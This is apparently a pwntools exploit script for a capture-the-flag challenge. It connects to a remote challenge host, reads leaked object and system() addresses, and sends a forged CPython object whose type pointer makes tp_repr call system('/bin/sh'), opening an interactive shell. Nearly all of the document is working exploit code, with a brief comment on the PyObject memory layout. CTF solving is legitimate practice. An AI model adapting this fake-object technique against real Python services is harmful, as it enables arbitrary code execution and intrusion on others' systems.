from pwn import *

context.arch = "amd64"
context.log_level = "debug"

io = remote("chal.2025.ductf.net", 30001)

io.recvuntil(b"(obj) = ")
obj_addr = int(io.recvline().strip(), 16)
log.critical(f"obj addr: {hex(obj_addr)}")

io.recvuntil(b"system = ")
system_addr = int(io.recvline().strip(), 16)
log.critical(f"system addr: {hex(system_addr)}")

"""
    In CPython 3.8+:
    `PyObject_HEAD` is 16 bytes (ob_refcnt, ob_type)
    typedef struct _object {
        Py_ssize_t ob_refconf;     # will increase when call type's method
        PyTypeObject *ob_type;
    } PyObject;
    typedef struct {
        PyObject ob_base;
        Py_ssize_t ob_size;   # number of items in variable part
    } PyVarObject;
"""
# payload = b""
# payload += b".bin/sh\x00"  # refcnt
# payload += p64(obj_addr - 0x48)  # 0x10 for head size
# payload += p64(system_addr)  # tp_repr offset is 88

payload = flat(
    [
        b".bin/sh\x00",  # ob_refcnt, will be refcnt inc'd then called as tp_repr arg
        p64(obj_addr - 88 + 16),  # set ob_type such that tp_repr points to obj+24
        p64(system_addr),  # tp_repr will point to this, so we call system("/bin/sh") !
    ],
    length=72,
    filler=b"\x00",
)

io.sendlineafter(b"fakeobj: ", payload.hex().encode())


io.interactive()
